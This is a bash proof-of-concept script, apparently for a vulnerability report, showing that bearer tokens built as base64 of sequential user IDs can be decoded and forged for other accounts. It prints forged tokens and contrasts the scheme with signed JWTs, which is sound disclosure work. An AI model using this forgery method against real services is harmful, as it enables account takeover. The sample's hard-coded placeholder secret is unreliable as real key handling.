#!/bin/bash

# POC: Insecure Token Generation - Predictable Base64 Encoded User IDs
# This demonstrates the vulnerability principle: tokens that are simply base64(user_id)
# can be trivially forged by any attacker.

echo "=========================================="
echo "Insecure Token Generation Vulnerability"
echo "=========================================="
echo ""

# Simulate what the vulnerable token generation does
echo "[*] Simulating vulnerable token generation process..."
echo ""

# Step 1: Simulate legitimate user authentication
USER_ID=1
echo "[*] Step 1: Legitimate user (user_id=$USER_ID) authenticates"
LEGITIMATE_TOKEN=$(echo -n "$USER_ID" | base64 | tr -d '\n')
echo "[+] Server generates token by base64-encoding user_id: $LEGITIMATE_TOKEN"
echo ""

# Verify the token decodes back to the user ID
DECODED=$(echo "$LEGITIMATE_TOKEN" | base64 -d)
if [ "$DECODED" = "$USER_ID" ]; then
  echo "[+] CONFIRMED: Token '$LEGITIMATE_TOKEN' decodes to user_id=$DECODED"
  echo "[+] VULNERABILITY: Token reveals the user ID in plaintext after decoding"
else
  echo "[-] Decoding failed"
  exit 1
fi
echo ""

# Step 2: Demonstrate trivial token forgery
echo "[*] Step 2: Attacker forges tokens for other user IDs..."
echo ""

echo "After intercepting one legitimate token, an attacker can now:"
for ATTACKER_TARGET in 2 3 4 5 100 999; do
  FORGED=$(echo -n "$ATTACKER_TARGET" | base64 | tr -d '\n')
  echo "  • Access user $ATTACKER_TARGET with token: $FORGED"
done
echo ""

# Step 3: Demonstrate lack of cryptographic protection
echo "[*] Step 3: Analyzing token security characteristics..."
echo ""

echo "Token 1 (user_id=1):   $LEGITIMATE_TOKEN"
echo "Token 2 (user_id=2):   $(echo -n '2' | base64 | tr -d '\n')"
echo "Token 3 (user_id=3):   $(echo -n '3' | base64 | tr -d '\n')"
echo ""

echo "Analysis:"
echo "  ✗ NO SIGNATURE: Token is not signed with a secret key"
echo "  ✗ NO HMAC: No message authentication code to verify integrity"
echo "  ✗ NO ENCRYPTION: Token content is plaintext (base64 is encoding, not encryption)"
echo "  ✗ NO EXPIRATION: Token has no TTL or exp claim"
echo "  ✗ REVERSIBLE: base64 -d trivially reverses the encoding"
echo "  ✗ PREDICTABLE: User IDs are sequential integers, making all tokens predictable"
echo ""

# Step 4: Show the attack in action
echo "[*] Step 4: Attack demonstration..."
echo ""
echo "Scenario: Attacker sees token 'MQ==' for user 1"
echo ""
echo "  Step 1: Decode: echo 'MQ==' | base64 -d"
DECODED_DEMO=$(echo "MQ==" | base64 -d 2>/dev/null)
echo "         Result: $DECODED_DEMO"
echo ""
echo "  Step 2: Now attacker knows user_id=1 → token=MQ=="
echo "  Step 3: Attacker guesses for other users:"
for ID in 2 3 50 99 100; do
  T=$(echo -n "$ID" | base64 | tr -d '\n')
  echo "           user_id=$ID → token=$T"
done
echo ""
echo "  Step 4: Attacker uses ANY of these forged tokens to access other accounts"
echo ""

# Step 5: Verify this is reproducible
echo "[*] Step 5: Verifying vulnerability reproducibility..."
echo ""

# Test multiple times to show consistency
CONSISTENCY_CHECK=true
for i in {1..5}; do
  RECHECK=$(echo -n "1" | base64 | tr -d '\n')
  if [ "$RECHECK" != "$LEGITIMATE_TOKEN" ]; then
    CONSISTENCY_CHECK=false
    break
  fi
done

if [ "$CONSISTENCY_CHECK" = true ]; then
  echo "[+] CONFIRMED: Token generation is deterministic and reproducible"
  echo "[+] Same user_id always generates same token"
  echo "[+] Attacker can reliably forge tokens for any user_id"
else
  echo "[-] Unexpected: Token generation not consistent"
  exit 1
fi
echo ""

# Step 6: Compare to secure approach
echo "[*] Step 6: Comparison to secure token generation..."
echo ""
echo "VULNERABLE (current implementation):"
echo "  token = base64(user_id)"
echo "  token = base64(1) = MQ=="
echo ""
echo "SECURE (recommended):"
echo "  import jwt"
echo "  token = jwt.encode("
echo "    {'user_id': 1, 'exp': datetime.now() + timedelta(hours=1)}"
echo "    secret='strong-secret-key'"
echo "    algorithm='HS256'"
echo "  )"
echo "  Result: eyJ0eXAiOiJKV1QiLCJhbGc... (cryptographically signed)"
echo ""

# Step 7: Summary
echo "=========================================="
echo "VULNERABILITY SUMMARY"
echo "=========================================="
echo ""
echo "[+] CRITICAL: Insecure Token Generation Confirmed"
echo ""
echo "Impact:"
echo "  • Complete authentication bypass possible"
echo "  • ANY user account can be accessed without password"
echo "  • No cryptographic protection whatsoever"
echo "  • Tokens are trivially forgeable"
echo ""
echo "Affected Tokens:"
echo "  • /token endpoint response tokens"
echo "  • Any authentication using bearer tokens"
echo ""
echo "Attack Complexity: TRIVIAL"
echo "  • Requires only base64 encoding"
echo "  • No specialized tools needed"
echo "  • One decoded token reveals the pattern"
echo "  • Sequential user IDs make forgery obvious"
echo ""

exit 0